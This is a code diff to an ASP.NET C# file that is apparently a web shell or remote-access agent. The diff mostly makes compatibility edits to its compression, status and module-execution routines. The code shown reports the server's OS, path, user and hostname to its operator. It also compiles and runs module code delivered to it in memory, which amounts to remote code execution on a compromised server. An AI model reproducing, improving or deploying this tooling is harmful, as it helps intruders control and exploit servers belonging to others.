@@ -148,11 +148,11 @@
         
         private byte[] compress(byte[] data)
         {
-            using (var msi = new MemoryStream(data))
-            using (var mso = new MemoryStream()) {
-                using (var gs = new GZipStream(mso, CompressionMode.Compress))
+            using (MemoryStream mso = new MemoryStream())
+            {
+                using (GZipStream gs = new GZipStream(mso, CompressionMode.Compress))
                 {
-                    msi.CopyTo(gs);
+                    gs.Write(data, 0, data.Length);
                 }
         
                 return mso.ToArray();
@@ -161,14 +161,24 @@
         
         private byte[] uncompress(byte[] data)
         {
-            using (var msi = new MemoryStream(data))
-            using (var mso = new MemoryStream()) {
-                using (var gs = new GZipStream(msi, CompressionMode.Decompress))
+            using (GZipStream gs = new GZipStream(new MemoryStream(data), CompressionMode.Decompress))
+            {
+                const int size = 4096;
+                byte[] buffer = new byte[size];
+                using (MemoryStream mso = new MemoryStream())
                 {
-                    gs.CopyTo(mso);
+                    int count = 0;
+                    do
+                    {
+                        count = gs.Read(buffer, 0, size);
+                        if (count > 0)
+                        {
+                            mso.Write(buffer, 0, count);
+                        }
+                    }
+                    while (count > 0);
+                    return mso.ToArray();
                 }
-        
-                return mso.ToArray();
             }
         }
 
@@ -200,7 +210,7 @@
             return dict;
         }
 
-        private string pack_value(string key, string val, bool end=false)
+        private string pack_value(string key, string val, bool end)
         {
             if (end)
             {
@@ -273,17 +283,17 @@
         private string do_status()
         {
             string response = "";
-            response += pack_value("so", get_so());
+            response += pack_value("so", get_so(), false);
             response += FIELD_SEPARATOR;
-            response += pack_value("pwd", Path.GetDirectoryName(this.Request.PhysicalPath).Replace(@"\", @"/"));
+            response += pack_value("pwd", Path.GetDirectoryName(this.Request.PhysicalPath).Replace(@"\", @"/"), false);
             response += FIELD_SEPARATOR;
-            response += pack_value("type", "cs");
+            response += pack_value("type", "cs", false);
             response += FIELD_SEPARATOR;
-            response += pack_value("version", Environment.Version.ToString());
+            response += pack_value("version", Environment.Version.ToString(), false);
             response += FIELD_SEPARATOR;
-            response += pack_value("user", get_user());
+            response += pack_value("user", get_user(), false);
             response += FIELD_SEPARATOR;
-            response += pack_value("hostname", get_hostName());
+            response += pack_value("hostname", get_hostName(), false);
             return generate_response(SUCC_CODE, response);
         }
 
@@ -351,7 +361,7 @@
                 compilerParams.GenerateInMemory = true;
                 compilerParams.GenerateExecutable = false;
                 compilerParams.ReferencedAssemblies.Add("System.dll");
-                compilerParams.ReferencedAssemblies.Add("System.Linq.dll");
+                //compilerParams.ReferencedAssemblies.Add("System.Linq.dll");
 
                 load_references(compilerParams, mod_refs);
 
@@ -369,19 +379,21 @@
                 object mod_assembly_instance = mod_assembly.CreateInstance(mod_name);
                 object mod_assembly_result = mod_assembly_method.Invoke(mod_assembly_instance, new object[] { mod_cwd, mod_raw_args, mod_token });
                 
-                string[] result = ((IEnumerable)mod_assembly_result).Cast<object>().Select(x => x.ToString()).ToArray();
+                List<Object> mod_assembly_results = new List<Object>((IEnumerable<Object>)mod_assembly_result);
 
-                if (result.Length != 2)
+                if (mod_assembly_results.Count != 2)
                     return generate_response(ERR_CODE, ERR_INVALID_MOD_RESPONSE);
-                
-                string status_code = result[0];
-                string message     = result[1];
+
+                string status_code = mod_assembly_results[0].ToString();
+                string message     = mod_assembly_results[1].ToString();
     
                 return generate_response(status_code, message);
             }
             catch(Exception ex)
             {
                 string ex_message = "Exception: " + ERR_EXCEPTION_FROM_MODULE + Environment.NewLine + ex.ToString();
+                for (int i=0; i < results.Errors.Count; i++)                
+                    ex_message +=  i.ToString() + ": " + results.Errors[i].ToString() + Environment.NewLine;
                 return generate_response(ERR_CODE, ex_message);
             }
         }
